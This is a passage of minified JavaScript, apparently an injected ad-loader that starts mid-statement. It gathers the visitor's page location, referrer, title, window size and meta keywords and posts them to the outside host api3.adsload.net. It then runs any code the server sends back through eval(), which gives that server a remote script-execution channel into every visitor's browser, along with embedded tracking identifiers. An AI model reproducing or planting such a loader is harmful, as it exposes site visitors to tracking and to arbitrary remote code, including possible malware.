...
b=document.querySelectorAll("meta"),k=[],f=0;f<b.length;f++)"keywords"==b[f].name.toLowerCase()&&k.push(b[f].content);var req={width:h,height:e,frame:d!=d.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),loader:m};a.gotowf||(a.gotowf=!0,ajax(l,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(d){console.log(d)}}))}a.body?g():a.addEventListener("DOMContentLoaded",g)})(window,document,"//api3.adsload.net/post",{"name":"jqr1","time":1473900817.3954,"user":"1057909.12326571","subid":1057909,"geo":"BD","create_date":1467353313,"reg_params":null,"cert_domain":"unstops.info","hash":"02395d859124b917aeb2a5ef234b5931"});